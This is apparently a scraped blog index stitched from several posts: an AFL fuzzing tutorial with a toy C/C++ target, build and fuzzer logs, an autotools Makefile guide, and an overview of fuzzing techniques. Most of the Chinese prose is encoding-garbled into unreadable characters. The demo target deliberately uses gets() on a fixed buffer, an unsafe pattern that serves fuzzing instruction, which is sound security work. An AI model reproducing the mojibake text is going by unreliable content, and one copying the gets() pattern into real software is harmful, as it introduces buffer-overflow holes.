è¡¨æ˜ç›¸åŒè¾“å…¥æ˜¯å¦äº§ç”Ÿäº†ç›¸åŒçš„è¡Œä¸ºï¼Œä¸€èˆ¬ç»“æœéƒ½æ˜¯100%ï¼Œå¦‚æœä½äº100%å¹¶ä¸”å˜çº¢ï¼Œåˆ™éœ€è¦æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å¯»æ‰¾è§£å†³æ­¥éª¤ã€‚ 9) CPU load [cpu: 25%] æ˜¾ç¤ºäº†æœ¬åœ°ç³»ç»Ÿä¸Šçš„CPUåˆ©ç”¨ç‡ã€‚å®ƒæ˜¯è®¡ç®—å¤„äºâ€œå¯è¿è¡Œâ€çŠ¶æ€çš„è¿›ç¨‹æ•°ï¼Œç„¶åå°†å…¶ä¸ç³»ç»Ÿä¸Šçš„é€»è¾‘æ ¸æ•°è¿›è¡Œæ¯”è¾ƒã€‚ ç»¿è‰²-åˆ™è¡¨ç¤ºä½¿ç”¨çš„CPUæ ¸æ¯”å¯ç”¨çš„å°‘ çº¢è‰²-åˆ™è¡¨ç¤ºæ‚¨çš„CPUå¯èƒ½å·²ç»è¶…é¢è®¢é˜…è¿è¡Œé¢å¤–çš„fuzzerså¯èƒ½ä¸ä¼šç»™ä½ å¸¦æ¥ä»»ä½•å¥½å¤„ 1 10) Addendum: status and plot files For unattended operation, some of the key status screen information can be also found in a machine-readable format in the fuzzer_stats file in the output directory. This includes: - start_time - unix time indicating the start time of afl-fuzz - last_update - unix time corresponding to the last update of this file - fuzzer_pid - PID of the fuzzer process - cycles_done - queue cycles completed so far - execs_done - number of execve() calls attempted - execs_per_sec - current number of execs per second - paths_total - total number of entries in the queue - paths_found - number of entries discovered through local fuzzing - paths_imported - number of entries imported from other instances - max_depth - number of levels in the generated data set - cur_path - currently processed entry number - pending_favs - number of favored entries still waiting to be fuzzed - pending_total - number of all entries waiting to be fuzzed - stability - percentage of bitmap bytes that behave consistently - variable_paths - number of test cases showing variable behavior - unique_crashes - number of unique crashes recorded - unique_hangs - number of unique hangs encountered - command_line - full command line used for the fuzzing session - slowest_exec_ms- real time of the slowest execution in ms - peak_rss_mb - max rss usage reached during fuzzing in mb c ç¼–è¯‘æ’æ¡©æµ‹è¯• ç¼–å†™alftestcä»£ç  //afltestc.c #include &lt;stdio.h> #include &lt;string.h> #include &lt;stdlib.h> #include &lt;signal.h> void test (char *buf) &#123; int len = strlen(buf); int i = 0; if(buf[0] == 's' &amp;&amp; buf[1] == 'i')&#123; if(buf[2] == 'z' &amp;&amp; buf[3] == 'a')&#123; if(buf[4] == 'i' &amp;&amp; buf[5] == 'f')&#123; if(len == 6)&#123; printf(\"awesome found sizaif !\\n\"); raise(SIGSEGV); &#125;else&#123; printf(\"sorry not\\n\"); &#125; &#125; &#125; &#125; &#125; int main(int argc, char *argv[]) &#123; char buf[1000] = &#123;0&#125;; gets(buf); test(buf); return 0; &#125; åˆ›å»ºconfigure makefileç­‰æ–‡ä»¶ root@0187031113b5:/home/workhome/afl-test/ins-c# ls Makefile.am aclocal.m4 autom4te.cache compile config.h.in configure depcomp missing Makefile.in afltestc.c autoscan.log config.h config.log configure.ac install-sh stamp-h1 ä½¿ç”¨afl-gcc æ’æ¡© afl-gccæ’æ¡© root@0187031113b5:/home/workhome/afl-test/ins-c# CC=afl-gcc ./configure checking for a BSD-compatible install... /usr/bin/install -c checking whether build environment is sane... yes checking for a thread-safe mkdir -p... /usr/bin/mkdir -p checking for gawk... no checking for mawk... mawk checking whether make sets $(MAKE)... yes checking whether make supports nested variables... yes checking for gcc... afl-gcc checking whether the C compiler works... yes checking for C compiler default output file name... a.out checking for suffix of executables... checking whether we are cross compiling... no checking for suffix of object files... o checking whether we are using the GNU C compiler... yes checking whether afl-gcc accepts -g... yes checking for afl-gcc option to accept ISO C89... none needed checking whether afl-gcc understands -c and -o together... yes checking whether make supports the include directive... yes (GNU style) checking dependency style of afl-gcc... gcc3 checking that generated files are newer than configure... done configure: creating ./config.status config.status: creating Makefile config.status: creating config.h config.status: executing depfiles commands ç¼–è¯‘è¿è¡Œ root@0187031113b5:/home/workhome/afl-test/ins-c# make afl_harden=1 make all-am make[1]: Entering directory '/home/workhome/afl-test/ins-c' afl-gcc -DHAVE_CONFIG_H -I. -g -O2 -MT afltestc.o -MD -MP -MF .deps/afltestc.Tpo -c -o afltestc.o afltestc.c afl-cc 2.57b by &lt;lcamtuf@google.com> afltestc.c: In function 'main': afltestc.c:26:5: warning: implicit declaration of function 'gets'; did you mean 'fgets'? [-Wimplicit-function-declaration] 26 | gets(buf); | ^~~~ | fgets afl-as 2.57b by &lt;lcamtuf@google.com> [+] Instrumented 11 locations (64-bit, non-hardened mode, ratio 100%). mv -f .deps/afltestc.Tpo .deps/afltestc.Po afl-gcc -g -O2 -o afltestc afltestc.o afl-cc 2.57b by &lt;lcamtuf@google.com> /usr/bin/ld: afltestc.o: in function `main': /home/workhome/afl-test/ins-c/afltestc.c:26: warning: the `gets' function is dangerous and should not be used. make[1]: Leaving directory '/home/workhome/afl-test/ins-c' åˆ›å»º in,crash æ–‡ä»¶å¤¹ in ä¸­åˆ›å»ºåˆå§‹seed ï¼š hello.txt # hello.txt hello afl-fuzz è¿è¡Œ $ afl-fuzz -d -i in -o crash ./afltestc root@0187031113b5:/home/workhome/afl-test/ins-c# afl-fuzz -d -i in -o crash ./afltestc afl-fuzz 2.57b by &lt;lcamtuf@google.com> [+] You have 16 CPU cores and 3 runnable tasks (utilization: 19%). [+] Try parallel jobs - see /usr/local/share/doc/afl/parallel_fuzzing.txt. [*] Checking CPU core loadout... [+] Found a free CPU core, binding to #0. [*] Checking core_pattern... [*] Setting up output directories... [*] Scanning 'in'... [+] No auto-generated dictionary tokens to reuse. [*] Creating hard links for all input files... [*] Validating target binary... [*] Attempting dry run with 'id:000000,orig:hello.txt'... [*] Spinning up the fork server... [+] All right - fork server is up. len = 6, map size = 4, exec speed = 164 us [+] All test cases processed. [+] Here are some useful stats: Test case count : 1 favored, 0 variable, 1 total Bitmap range : 4 to 4 bits (average: 4.00 bits) Exec timing : 164 to 164 us (average: 164 us) [*] No -t option specified, so I'll use exec timeout of 20 ms. [+] All set and ready to roll! crash if(buf[0] == 's' &amp;&amp; buf[1] == 'i')&#123; if(buf[2] == 'z' &amp;&amp; buf[3] == 'a')&#123; if(buf[4] == 'i' &amp;&amp; buf[5] == 'f')&#123; if(len == 6)&#123; printf(\"awesome found sizaif !\\n\"); raise(SIGSEGV); &#125;else&#123; printf(\"sorry not\\n\"); &#125; &#125; &#125; &#125; å½“è¾“å…¥seed çªå˜ä¸ºsizaifï¼Œä¸”é•¿åº¦ä¸º6æ—¶ï¼Œcrash plot ä½¿ç”¨afl-clang-fast æ’æ¡©: root@0187031113b5:/home/workhome/afl-test/ins-c# CC=afl-clang-fast ./configure checking for a BSD-compatible install... /usr/bin/install -c checking whether build environment is sane... yes checking for a thread-safe mkdir -p... /usr/bin/mkdir -p checking for gawk... no checking for mawk... mawk checking whether make sets $(MAKE)... yes checking whether make supports nested variables... yes checking for gcc... afl-clang-fast checking whether the C compiler works... yes checking for C compiler default output file name... a.out checking for suffix of executables... checking whether we are cross compiling... no checking for suffix of object files... o checking whether we are using the GNU C compiler... yes checking whether afl-clang-fast accepts -g... yes checking for afl-clang-fast option to accept ISO C89... none needed checking whether afl-clang-fast understands -c and -o together... yes checking whether make supports the include directive... yes (GNU style) checking dependency style of afl-clang-fast... gcc3 checking that generated files are newer than configure... done configure: creating ./config.status config.status: creating Makefile config.status: creating config.h config.status: executing depfiles commands ç¼–è¯‘è¿è¡Œ oot@0187031113b5:/home/workhome/afl-test/ins-c# make afl_harden=1 make all-am make[1]: Entering directory '/home/workhome/afl-test/ins-c' afl-clang-fast -DHAVE_CONFIG_H -I. -g -O2 -MT afltestc.o -MD -MP -MF .deps/afltestc.Tpo -c -o afltestc.o afltestc.c afl-clang-fast 2.57b by &lt;lszekeres@google.com> afltestc.c:26:5: warning: implicit declaration of function 'gets' is invalid in C99 [-Wimplicit-function-declaration] gets(buf); ^ afl-llvm-pass 2.57b by &lt;lszekeres@google.com> [+] Instrumented 11 locations (non-hardened mode, ratio 100%). 1 warning generated. mv -f .deps/afltestc.Tpo .deps/afltestc.Po afl-clang-fast -g -O2 -o afltestc afltestc.o afl-clang-fast 2.57b by &lt;lszekeres@google.com> /usr/bin/ld: afltestc.o: in function `main': /home/workhome/afl-test/ins-c/afltestc.c:26: warning: the `gets' function is dangerous and should not be used. make[1]: Leaving directory '/home/workhome/afl-test/ins-c' åˆ›å»º in,crash æ–‡ä»¶å¤¹ in ä¸­åˆ›å»ºåˆå§‹seed ï¼š hello.txt # hello.txt abc afl-fuzz è¿è¡Œ $ afl-fuzz -d -i in -o crash2 ./afltestc root@0187031113b5:/home/workhome/afl-test/ins-c# afl-fuzz -d -i in -o crash2 ./afltestc afl-fuzz 2.57b by &lt;lcamtuf@google.com> [+] You have 16 CPU cores and 2 runnable tasks (utilization: 12%). [+] Try parallel jobs - see /usr/local/share/doc/afl/parallel_fuzzing.txt. [*] Checking CPU core loadout... [+] Found a free CPU core, binding to #0. [*] Checking core_pattern... [*] Setting up output directories... [*] Scanning 'in'... [+] No auto-generated dictionary tokens to reuse. [*] Creating hard links for all input files... [*] Validating target binary... [*] Attempting dry run with 'id:000000,orig:hello.txt'... [*] Spinning up the fork server... [+] All right - fork server is up. len = 4, map size = 3, exec speed = 152 us [+] All test cases processed. [+] Here are some useful stats: Test case count : 1 favored, 0 variable, 1 total Bitmap range : 3 to 3 bits (average: 3.00 bits) Exec timing : 152 to 152 us (average: 152 us) [*] No -t option specified, so I'll use exec timeout of 20 ms. [+] All set and ready to roll! crash plot c++ ç¼–è¯‘æ’æ¡©æµ‹è¯• ç¼–å†™afltestc++ä»£ç  #include &lt;iostream&gt; #include &lt;string&gt; #include &lt;signal.h&gt; using namespace std; void test (string buf) &#123; int len &#x3D; buf.length(); if ( len &#x3D;&#x3D; 6 &amp;&amp; buf[0] &#x3D;&#x3D; &#39;s&#39; &amp;&amp; buf[1]&#x3D;&#x3D;&#39;i&#39; &amp;&amp; buf[2]&#x3D;&#x3D;&#39;z&#39;)&#123; cout&lt;&lt;&quot;awesome found sizaif !&quot;&lt;&lt;endl; raise(SIGSEGV); &#125; else&#123; cout&lt;&lt;&quot;sorry not&quot;&lt;&lt;endl; &#125; &#125; int main(int argc, char *argv[]) &#123; string buf &#x3D; &quot;&quot;; cin&gt;&gt;buf test(buf); return 0; &#125; ä½¿ç”¨afl-g++æ’æ¡© : root@0187031113b5:/home/workhome/afl-test/ins-c++# afl-g++ -g -o afltestc++ afltestc++.cpp afl-cc 2.57b by &lt;lcamtuf@google.com> afl-as 2.57b by &lt;lcamtuf@google.com> [+] Instrumented 41 locations (64-bit, non-hardened mode, ratio 100%). è¿è¡Œ root@0187031113b5:/home/workhome/afl-test/ins-c++# afl-fuzz -b 6 -i in -o crashc++ ./afltestc++ afl-fuzz 2.57b by &lt;lcamtuf@google.com> [+] You have 16 CPU cores and 2 runnable tasks (utilization: 12%). [+] Try parallel jobs - see /usr/local/share/doc/afl/parallel_fuzzing.txt. [*] Checking CPU core loadout... [+] Found a free CPU core, binding to #6. [*] Checking core_pattern... [*] Setting up output directories... [*] Scanning 'in'... [+] No auto-generated dictionary tokens to reuse. [*] Creating hard links for all input files... [*] Validating target binary... [*] Attempting dry run with 'id:000000,orig:hello.txt'... [*] Spinning up the fork server... [+] All right - fork server is up. len = 29, map size = 15, exec speed = 212 us [+] All test cases processed. [+] Here are some useful stats: Test case count : 1 favored, 0 variable, 1 total Bitmap range : 15 to 15 bits (average: 15.00 bits) Exec timing : 212 to 212 us (average: 212 us) [*] No -t option specified, so I'll use exec timeout of 20 ms. [+] All set and ready to roll! crash plot ä½¿ç”¨afl-clang-fast++ root@0187031113b5:/home/workhome/afl-test/ins-c++# afl-clang-fast++ -g -o afltestc++clang afltestc++.cpp afl-clang-fast 2.57b by &lt;lszekeres@google.com> afl-llvm-pass 2.57b by &lt;lszekeres@google.com> [+] Instrumented 127 locations (non-hardened mode, ratio 100%). crash plot","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"è®ºæ–‡","slug":"Master/è®ºæ–‡","permalink":"https://www.sizaif.com/navigation/categories/Master/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"è®ºæ–‡","slug":"è®ºæ–‡","permalink":"https://www.sizaif.com/tags/%E8%AE%BA%E6%96%87/"},{"name":"AFL","slug":"AFL","permalink":"https://www.sizaif.com/tags/AFL/"}],"author":"sizaif"},{"title":"Linux ä¸‹C/C++ ç”ŸæˆConfigure å’ŒMakefile","slug":"linux-ä¸‹C-C-ç”ŸæˆConfigure-å’ŒMakefile","date":"2022-04-09T03:58:13.000Z","updated":"2022-04-10T08:50:34.232Z","comments":true,"path":"posts/f4dff8fd/","link":"","permalink":"https://www.sizaif.com/posts/f4dff8fd/","excerpt":"","text":"linux ä¸‹C/C++ ç”ŸæˆConfigure å’ŒMakefile å‰æï¼š automake ç®€è¦æ­¥éª¤ ç¼–å†™test.c è¿è¡Œautoscan è¿è¡Œmv configure.scan configure.ac ä¿®æ”¹configure.acä¸­å†…å®¹ # -*- Autoconf -*- # Process this file with autoconf to produce a configure script. AC_PREREQ([2.69]) AC_INIT(test, 1.0, sizaif@mail.com) AC_CONFIG_SRCDIR([test.cpp]) AC_CONFIG_HEADERS([config.h]) AM_INIT_AUTOMAKE # å¢åŠ  # Checks for programs. AC_PROG_CXX AC_PROG_CC # Checks for libraries. # Checks for header files. # Checks for typedefs, structures, and compiler characteristics. AC_TYPE_SIZE_T # Checks for library functions. AC_CONFIG_FILES([Makefile]) è¿è¡Œaclocal åˆ›å»ºMakefile.am AUTOMAKE_OPTIONS&#x3D;foreign # å›ºå®šå†™æ³• bin_PROGRAMS&#x3D;test # ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶åç§° test_SOURCES&#x3D;test.c # å¯æ‰§è¡Œæ–‡ä»¶åç§°_SOURCES è¿è¡Œautomake --add-missing è¿è¡Œautoconf ç”Ÿæˆconfigure æ–‡ä»¶ æ‰§è¡Œ./configureå°±å¯ä»¥å¾—åˆ°Makefile , ä»¥åŠconfig.hæ–‡ä»¶","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"make","slug":"make","permalink":"https://www.sizaif.com/tags/make/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://www.sizaif.com/tags/ubuntu/"}],"author":"sizaif"},{"title":"æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯","slug":"æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯","date":"2022-04-07T06:49:59.000Z","updated":"2022-04-07T06:52:08.750Z","comments":true,"path":"posts/d619a3ee/","link":"","permalink":"https://www.sizaif.com/posts/d619a3ee/","excerpt":"","text":"æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ 2022-01-09- [TOC] æ¨¡ç³Šæµ‹è¯•åŸºæœ¬æµç¨‹: é¢„å¤„ç†(preprocessing)ã€è¾“å…¥æ•°æ®æ„é€ (input building)ã€è¾“å…¥é€‰æ‹©(input selection)ã€è¯„ä¼°(evalution)ã€ç»“æœåˆ†æ(post-fuzzing) 2013å¹´AFLè¯ç”Ÿ,åŸºäºè¦†ç›–ç‡å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯•æˆä¸ºä¸»æµæ–¹å‘ AFL æ˜¯è¦†ç›–ç‡ä¸ºå¯¼å‘çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·,é€šè¿‡æ’æ¡©çš„æ–¹æ³•,é‡‡é›†è¾“å…¥æ•°æ®å¯¹åº”çš„è¾¹è¦†ç›–ç‡,ä½œä¸ºæ¨¡ç³Šæµ‹è¯•ç§å­é€‰å–çš„è¡¡é‡æŒ‡æ ‡ï¼é€šè¿‡ä½¿ç”¨è¿›åŒ–ç®—æ³•ä»¥åŠç²¾å¿ƒæ„é€ çš„çªå˜ç­–ç•¥ é¢„å¤„ç† å·¥ä½œ: æœé›†ç›®æ ‡ç›¸å…³ä¿¡æ¯å¹¶åˆ¶å®šæ¨¡ç³Šæµ‹è¯•çš„ç­–ç•¥, ä¸ºç›‘æ§ç›®æ ‡åœ¨æµ‹è¯•ä¸­çš„è¿è¡ŒçŠ¶æ€åšå¿…è¦çš„å‡†å¤‡ï¼é€šå¸¸ä¾èµ–äºæ’æ¡©ã€ç¬¦å·æ‰§è¡Œä»¥åŠæ±¡ç‚¹åˆ†æè¿™ç±»ç¨‹åºåˆ†ææŠ€æœ¯ æœé›†ç›®æ ‡ç›¸å…³ä¿¡æ¯,æ¯”å¦‚ç›®æ ‡çš„è¾“å…¥æ•°æ®æ ¼å¼ã€ç›®æ ‡çš„å†…éƒ¨ç»“æ„,å¹¶ä¸ºç›‘æ§æµ‹è¯•ä¸­ç›®æ ‡çš„çŠ¶æ€å˜åŒ–åšå¿…è¦çš„å‡†å¤‡ï¼è¯¥ç¯èŠ‚é¢ä¸´çš„æŒ‘æˆ˜æ˜¯:ä½¿ç”¨ä»€ä¹ˆç¨‹åºåˆ†ææŠ€æœ¯,ä»¥åŠæ¨¡ç³Šæµ‹è¯•ç©¶ç«Ÿéœ€è¦å¯¹ç›®æ ‡å†…éƒ¨ä¿¡æ¯æœ‰å¤šè¯¦ç»†çš„äº†è§£ æ ¹æ®æ¨¡ç³Šæµ‹è¯•å¯¹ç¨‹åºå†…éƒ¨ä¿¡æ¯åˆ†æçš„ç¨‹åº¦,ç°ä»£çš„æ¨¡ç³Šæµ‹è¯•æ–¹æ³•å¯ä»¥åˆ’åˆ†ä¸ºï¼“ç±»:é»‘ç›’æ¨¡ç³Šæµ‹è¯• (blackï¼§boxfuzzing)ã€ç°ç›’æ¨¡ç³Šæµ‹è¯•(greyï¼§boxfuzzing) å’Œç™½ç›’æ¨¡ç³Šæµ‹è¯•(whiteï¼§boxfuzzing) 1. æ’æ¡©: æ’æ¡©æŠ€æœ¯é€šè¿‡å‘ç›®æ ‡çš„ä»£ç ä¸­åˆé€‚çš„ä½ç½®æ·»åŠ é¢„è®¾å¥½çš„ä»£ç ,è·å¾—ç¨‹åºçš„é™æ€æˆ–åŠ¨æ€æ‰§è¡Œä¿¡æ¯ï¼æ¯”å¦‚ç¨‹åºçš„æŠ½è±¡è¯­æ³•æ ‘,è¦†ç›–ç‡ä»¥åŠå‡½æ•°å†…å˜é‡å–å€¼ç­‰ åŠ¨æ€æ’æ¡© åŠ¨æ€æ’æ¡©åˆ™æ˜¯åœ¨è¿è¡Œçš„è¿‡ç¨‹ä¸­å¯¹è¿è¡Œè¿‡çš„ä»£ç  è¿›è¡Œæ’æ¡©ï¼æ¯”å¦‚åˆ©ç”¨ QEMUç­‰æ¨¡æ‹ŸæŠ€æœ¯,è¿›è¡ŒåŠ¨æ€æ’æ¡©,å¯ä»¥è·å¾—ç¨‹åºè¿è¡Œæ—¶çš„ä¿¡æ¯,ç¼ºç‚¹æ˜¯èµ„æºçš„å¼€é”€å¤§ é™æ€æ’æ¡© é€šè¿‡ GCCç¼–è¯‘å™¨åœ¨æ±‡ç¼–è¯­è¨€ä¸Šæ’ æ¡©,LLVMåœ¨ç”Ÿæˆçš„ä¸­é—´è¯­è¨€LLVMIR(low level virtual machine intermediate representation)ä¸Šæ’æ¡©ï¼ä¼˜ç‚¹æ˜¯èŠ‚çœæ—¶é—´ã€é€Ÿåº¦å¿«,ç¼ºç‚¹æ˜¯ä¾èµ–äºç¨‹åºæºç ï¼ æ’æ¡©æŠ€æœ¯çš„ç¼ºç‚¹æ˜¯ä¼šå¸¦æ¥èµ„æºçš„å¼€é”€ 2. ç¬¦å·æ‰§è¡Œ å°†ç¨‹åºè¡Œä¸ºçš„æ¨ç†å½’ç»“ä¸ºé€»è¾‘é¢†åŸŸçš„æ¨ç†,é€šè¿‡æ„å»ºä¸€ä¸ªè¡¨ç¤ºç¨‹åºæ‰§è¡Œçš„é€»è¾‘å…¬å¼,å¯ä»¥åŒæ—¶æ¨æ–­ä¸€ä¸ªç¨‹åºåœ¨ä¸åŒè¾“å…¥ä¸Šçš„è¡Œä¸ºï¼ è¯¥æ–¹æ³•å¯ä»¥ä½¿æ¨¡ç³Šæµ‹è¯•è·å¾—è¾ƒå¥½çš„è¦†ç›–ç‡,å¹¶å¯ä»¥æ·±å…¥åˆ°ç¨‹åºæ·±å¤„,æ¢å¯»å¯èƒ½å­˜åœ¨æ¼æ´çš„åŒºåŸŸ é™æ€ç¬¦å·æ‰§è¡Œ é™æ€ç¬¦å·æ‰§è¡Œé€šå¸¸ä¼šå› ä¸ºç¨‹åºä¸­å¾ªç¯å’Œé€’å½’çš„å­˜åœ¨,é™·å…¥åˆ°è·¯å¾„çˆ†ç‚¸ä¸­,è¿˜ä¼šå› ä¸ºè·¯å¾„çº¦æŸä¸­åŒ…å«è¯¸å¦‚å–Hashå€¼ç­‰æ“ä½œ,å¯¼è‡´çº¦æŸæ±‚è§£å¤±è´¥ï¼ç”±äºå­˜åœ¨è¿™2ç§é—®é¢˜,ä½¿ç”¨è¾ƒå¤šçš„æ˜¯åŠ¨æ€ç¬¦å·æ‰§è¡Œ åŠ¨æ€ç¬¦å·æ‰§è¡Œ åŠ¨æ€ç¬¦å·æ‰§è¡Œé€šè¿‡å¯¹ç¨‹åºè¿›è¡Œå®é™…æ‰§è¡Œä¸ç¬¦å·åŒ–æ‰§è¡Œ,ç»´æŠ¤ç¨‹åºçš„å®é™…çŠ¶æ€å’Œç¬¦å·åŒ–çŠ¶æ€,é€šè¿‡å°†éš¾ä»¥æ±‚è§£çš„çº¦æŸæ›¿æ¢ä¸ºå®é™…å€¼,ç¼“è§£äº†é™æ€ç¬¦å·æ‰§è¡Œçš„é—®é¢˜,å¹¶æŒ‰ç…§æ·±åº¦ä¼˜å…ˆçš„æœç´¢ç­–ç•¥å¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œäº†æ¢ç´¢ï¼ å­˜åœ¨çš„é—®é¢˜: â‘ ç”±äºç¨‹åºåˆ†æ”¯çš„å­˜åœ¨,è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ä»ç„¶å­˜åœ¨,ç¨‹åºè¶Šå¤æ‚, è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜å°±è¶Šä¸¥é‡ï¼è§£å†³çš„ä¸€ç§åŠæ³•æ˜¯é€šè¿‡å¯å‘å¼çš„æ–¹æ³•,é€‰æ‹©æ¯”è¾ƒé‡è¦çš„è·¯å¾„è¿›è¡Œæ¢ç´¢ï¼ â‘¡è™½ç„¶åŠ¨æ€ç¬¦å·æ‰§è¡Œä½¿ç”¨å®é™…å€¼æ›¿æ¢çš„æ–¹æ³•,è§£å†³äº†ä¸€ éƒ¨åˆ†é™æ€ç¬¦å·æ‰§è¡Œæ— æ³•ç»•è¿‡çš„çº¦æŸ,ä½†æ˜¯ä¹Ÿä¼šä¸¢å¤± ä¸€äº›è·¯å¾„,é€ æˆæ¢ç´¢ç»“æœçš„ä¸å®Œæ•´ï¼ â‘¢æ‰€æœ‰çš„ç¬¦å·æ‰§è¡ŒæŠ€æœ¯éƒ½å—é™äºçº¦æŸæ±‚è§£æ–¹æ³•çš„èƒ½åŠ›,æ¯”å¦‚å¦‚ä½•å¤„ç†ç±»ä¼¼å–ä½™æ“ä½œè¿™æ ·çš„éçº¿æ€§çº¦æŸ,ä»ç„¶æ˜¯ç¬¦å·æ‰§è¡Œé¢ä¸´çš„æŒ‘æˆ˜ ä¸ºäº†èƒ½å¤Ÿå°†ç¬¦å·æ‰§è¡Œæ›´å¥½åœ°åº”ç”¨åˆ°æ¨¡ç³Šæµ‹è¯•ä¸­,è¿‘å¹´æ¥è¯ç”Ÿäº†ä¸€äº›å·¥ä½œ, æ¯”å¦‚Pangolin é€šè¿‡ [22] å…è®¸ç¬¦å·æ‰§è¡Œé‡ç”¨ä¹‹å‰çš„è®¡ç®—ç»“æœ, Intrigueré€š [23]è¿‡åˆ©ç”¨å­—æ®µçº§çš„ä¿¡æ¯,éƒ½å®ç°äº†å¯¹ç¬¦å·æ‰§è¡Œè¿‡ç¨‹çš„åŠ é€Ÿï¼ ILF[24] é€šè¿‡ä½¿ç”¨ç¥ç»ç½‘ç»œ,å¯¹ç”±ç¬¦å·æ‰§è¡Œä¸“å®¶ç”Ÿæˆçš„å¤§é‡é«˜è´¨é‡è¾“å…¥æ•°æ®è¿›è¡Œå­¦ä¹ ,å¾—åˆ°äº†åˆé€‚ çš„æ¨¡ç³Šæµ‹è¯•ç­–ç•¥ [ï¼’ï¼’] Huang Heqing,Yao Peisen,Wu Rongxin,et alï¼Pangolin incremental hybrid fuzzing with polyhedral path abstraction [C]âˆ•âˆ• Procoftheï¼’ï¼ï¼’ï¼IEEE Sympon Security and Privacy (SP)ï¼Piscataway,NJ:IEEE,ï¼’ï¼ï¼’ï¼:ï¼‘ï¼–ï¼‘ï¼“ï¼‘ï¼–ï¼’ï¼— [ï¼’ï¼“] Cho M,Kim S,Kwon Tï¼Intriguer field-level constraint solving for hybrid fuzzing [C]âˆ•âˆ• procoftheï¼’ï¼ï¼‘ï¼™ ACM SIGSAC Conf on Computer and Communications Securityï¼ New York: ACM,ï¼’ï¼ï¼‘ï¼™:ï¼•ï¼‘ï¼•ï¼•ï¼“ï¼ [ï¼’ï¼”] He Jingxuan,Balunovi M,AmbroladzeN,et alï¼Learning to fuzz from symbolic execution with application to smart contracts[C]âˆ•âˆ•Procoftheï¼’ï¼ï¼‘ï¼™ ACM SIGSAC Conf on Computer and Communications Securityï¼New York:A CM, ï¼’ï¼ï¼‘ï¼™:ï¼•ï¼“ï¼‘ï¼•ï¼”ï¼˜ 3. æ±¡ç‚¹åˆ†æ è¯¥æŠ€æœ¯ä¼šè§‚æµ‹ç¨‹åºä¸­,å“ªäº›ç¨‹åºæ•°æ®å—åˆ°äº†é¢„å…ˆå‡†å¤‡å¥½çš„æ±¡æŸ“æº(æ¯”å¦‚è¾“å…¥)çš„æ±¡æŸ“,ç›®çš„æ˜¯è·Ÿè¸ªæ±¡æŸ“æºå’Œæ±‡èšç‚¹(æ¯”å¦‚æœ‰æ•æ„Ÿä¿¡æ¯çš„ç¨‹åºæ•°æ®)ä¹‹é—´çš„ä¿¡æ¯æµ é™æ€æ±¡ç‚¹åˆ†æ é™æ€æ±¡ç‚¹åˆ†æä¸éœ€è¦ç¨‹åºå®é™…è¿è¡Œ,é€šè¿‡å¯¹ç¨‹åºé™æ€åˆ†æ,è·å¾—ç¨‹åºæ§åˆ¶æµå›¾ã€æŠ½è±¡è¯­æ³•æ ‘ç­‰ä¿¡æ¯, ä¾æ®æ•°æ®æµä»¥åŠä¾èµ–å…³ç³»è¿›è¡Œæ±¡ç‚¹åˆ†æ; åŠ¨æ€æ±¡ç‚¹åˆ†æ åŠ¨æ€æ±¡ç‚¹åˆ†æåˆ™æ˜¯åœ¨ç¨‹åºå®é™…æ‰§è¡Œçš„è¿‡ç¨‹ä¸­,åˆ©ç”¨ç¨‹åºçš„åŠ¨æ€æ‰§è¡Œä¿¡æ¯è¿›è¡Œæ±¡ç‚¹åˆ†æ åŠ¨æ€æ±¡ç‚¹åˆ†ææ£€æµ‹çš„å¯ä¿¡åº¦æ›´é«˜,ä½†æ˜¯æ£€æµ‹ç»“æœæ˜¯å¦å…¨é¢, å–å†³äºåŠ¨æ€æ±¡ç‚¹åˆ†æå¯¹ç¨‹åºçš„è¦†ç›–æƒ…å†µ,è€Œä¸”åŠ¨æ€æ±¡ç‚¹åˆ†æä¼šæ¶ˆè€—æ›´å¤šçš„èµ„æº; é™æ€æ±¡ç‚¹åˆ†æåˆä¼šå’Œç¬¦å·æ‰§è¡Œä¸€æ ·,å¯èƒ½ä¼šé™·å…¥åˆ°è·¯å¾„çˆ†ç‚¸ä¸­,è€Œç®€åŒ–åçš„é™æ€æ±¡ç‚¹åˆ†æåˆå­˜åœ¨ç€ä¸¥é‡çš„è¿‡åº¦æ±¡æŸ“é—®é¢˜ å°†æ±¡ç‚¹åˆ†ææŠ€æœ¯åº”ç”¨åˆ°æ¨¡ç³Šæµ‹è¯•ä¸­,å¹¶é™ä½å…¶èµ„æºæ¶ˆè€—æ˜¯è¿‘å¹´æ¥çš„é‡è¦ç ”ç©¶æ–¹å‘ï¼æ¯”å¦‚GREYONE [ï¼’ï¼•]å°è¯•é€šè¿‡å‡å°‘æ±¡ç‚¹åˆ†æè·Ÿè¸ªçš„å¯¹è±¡ã€é™ä½æ±¡ç‚¹åˆ†æçš„å¼€é”€ã€æå‡æ¨¡ç³Šæµ‹è¯•çš„æ£€æµ‹æ•ˆç‡ï¼ [ï¼’ï¼•] GanShuitao,ZhangChao,ChenPeng,etalï¼GREYONE dataflowsensitivefuzzing[C]âˆ•âˆ•Procoftheï¼’ï¼™thUSENIX SecuritySymposiumï¼Berkeley,CA:USENIXAssociation, ï¼’ï¼ï¼’ï¼:ï¼’ï¼•ï¼—ï¼—ï¼’ï¼•ï¼™ï¼” åŸºäºAFLçš„æ¨¡ç³Šæµ‹è¯•æ–¹æ³• è¾“å…¥æ„é€  ç§å­è·å–ã€ç§å­ç­›é€‰ã€ç§å­çªå˜ 